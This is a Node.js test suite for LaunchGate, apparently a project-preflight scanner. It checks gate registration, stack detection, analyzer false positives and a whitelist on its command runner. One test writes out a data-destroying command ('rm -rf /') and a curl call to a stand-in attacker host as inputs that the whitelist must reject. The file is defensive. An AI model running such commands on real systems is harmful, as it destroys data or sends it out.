/**
 * LaunchGate Test Suite
 * Validates analyzers, stack detector, and command runners
 */

const assert = require('assert');
const path = require('path');
const { getAllGates, getGate } = require('../backend/analyzers');
const { detectStack } = require('../backend/services/stack-detector');
const { resolveAllowedCommand } = require('../backend/services/cli-runner');
const gate5 = require('../backend/analyzers/gate5-ai-quota');
const gate10 = require('../backend/analyzers/gate10-hygiene-context7');
const gate1 = require('../backend/analyzers/gate1-secrets');

let passedTests = 0;
let failedTests = 0;

function test(name, fn) {
  try {
    fn();
    console.log(`  ✓ ${name}`);
    passedTests++;
  } catch (err) {
    console.error(`  ✕ ${name}`);
    console.error(`    ${err.message}`);
    failedTests++;
  }
}

async function runTests() {
  console.log('\n🧪 Running LaunchGate Preflight Test Suite...\n');

  // Test 1: Gate Manifest
  test('All 12 Gates are registered and numbered 1-12', () => {
    const gates = getAllGates();
    assert.strictEqual(gates.length, 12, 'Must have 12 registered gates');
    gates.forEach((g, idx) => {
      assert.strictEqual(g.number, idx + 1, `Gate ${g.id} number mismatch`);
      assert.ok(g.name && g.name.length > 5, `Gate ${g.id} missing name`);
    });
  });

  // Test 2: Stack Detector
  test('Stack Detector detects Express and JavaScript', () => {
    const rootPath = path.resolve(__dirname, '..');
    const files = ['package.json', 'server.js', 'cli.js'];
    const stack = detectStack(rootPath, files);
    assert.ok(stack.isExpress, 'Should detect Express framework');
    assert.ok(stack.isCli, 'Should detect CLI runner');
    assert.ok(stack.languages.includes('JavaScript'), 'Should detect JavaScript language');
  });

  // Test 3: Allowed Commands Whitelist
  test('CLI Runner allows only whitelisted verification commands', () => {
    const validCmd = resolveAllowedCommand('typecheck');
    assert.ok(validCmd, 'typecheck should be allowed');
    assert.ok(validCmd.command.includes('npx'), 'typecheck should invoke npx');

    const blockedCmd = resolveAllowedCommand('rm -rf /');
    assert.strictEqual(blockedCmd, null, 'Arbitrary dangerous shell commands must be rejected');

    const blockedCurl = resolveAllowedCommand('curl http://evil.com');
    assert.strictEqual(blockedCurl, null, 'Network exfiltration commands must be rejected');
  });

  // Test 4: Gate 5 AI Substring Precision
  test('Gate 5 ignores words containing "ai" (email, maintain, claim)', async () => {
    // Dummy files that contain words with 'ai' but no AI SDK imports
    const dummyFiles = ['utils/email-sender.js'];
    const dummyStack = { isWeb: true };
    const mockProjectPath = path.resolve(__dirname, 'fixtures');

    // Run analyzer on self
    const result = await gate5.analyze(path.resolve(__dirname, '..'), ['cli.js', 'server.js'], dummyStack);
    const p0Leaks = (result.findings || []).filter(f => f.severity === 'P0');
    assert.strictEqual(p0Leaks.length, 0, 'No false positive P0 client leaks should be triggered');
  });

  // Test 5: Gate 10 Statement vs String Precision
  test('Gate 10 distinguishes between real debugger; statements and documentation strings', async () => {
    const root = path.resolve(__dirname, '..');
    const result = await gate10.analyze(root, ['README.md', 'server.js', 'cli.js'], { isWeb: true });
    const debuggerFindings = (result.findings || []).filter(f => f.id.includes('DEBUGGER'));
    assert.strictEqual(debuggerFindings.length, 0, 'No false positive debugger statements in documentation');
  });

  // Test 6: Gate 1 Secrets Whitelisting
  test('Gate 1 skips standard dummy template placeholders', async () => {
    const root = path.resolve(__dirname, '..');
    const result = await gate1.analyze(root, ['.env.example', 'cli.js', 'server.js'], { isWeb: true });
    const p0Secrets = (result.findings || []).filter(f => f.severity === 'P0');
    assert.strictEqual(p0Secrets.length, 0, 'No false positive P0 secrets in template files');
  });

  // Test 7: Demo Project Fixture Validation
  test('Demo project fixture exists and contains typical Vibe-SaaS files', () => {
    const fs = require('fs');
    const demoDir = path.resolve(__dirname, '..', 'demo', 'vibe-saas-prototype');
    assert.ok(fs.existsSync(demoDir), 'Demo fixture directory must exist');
    assert.ok(fs.existsSync(path.join(demoDir, 'package.json')), 'Demo package.json must exist');
    assert.ok(fs.existsSync(path.join(demoDir, 'app', 'page.tsx')), 'Demo page.tsx must exist');
    assert.ok(fs.existsSync(path.join(demoDir, 'app', 'api', 'webhooks', 'stripe', 'route.ts')), 'Demo Stripe webhook must exist');
  });

  // Test 8: Read-Only Scan Option
  test('runGate with readOnly option does not create .antigravity/ files', async () => {
    const { runGate } = require('../backend/analyzers');
    const root = path.resolve(__dirname, '..');
    const res = await runGate(root, 'gate-1', null, { readOnly: true });
    assert.strictEqual(res.gateResult.auditFilePath, null, 'auditFilePath must be null in read-only mode');
  });

  console.log(`\nResults: ${passedTests} passed, ${failedTests} failed\n`);
  if (failedTests > 0) {
    process.exit(1);
  }
}

runTests();
